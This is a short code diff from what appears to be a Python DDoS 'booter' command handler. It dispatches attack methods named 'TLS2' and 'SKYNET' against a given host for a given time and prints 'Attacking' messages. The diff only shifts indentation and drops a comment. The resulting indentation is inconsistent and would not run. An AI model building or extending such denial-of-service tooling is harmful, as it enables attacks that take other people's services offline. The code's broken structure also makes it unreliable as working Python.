@@ -97,8 +97,8 @@ def main():
                 print('Example: METHOD URL TIME');
                 
    
-elif "TLS2" in cnc:
-    try:
+     elif "TLS2" in cnc:
+   try:
         host = cnc.split()[1]
         time = cnc.split()[2]
         print("Attacking " + host + " For " + time + " ")
@@ -110,7 +110,7 @@ elif "TLS2" in cnc:
 
 
    
-           elif "SKYNET" in cnc:  # SKYNET
+           elif "SKYNET" in cnc:  
             try:
                 host = cnc.split()[1]
                 time = cnc.split()[2]
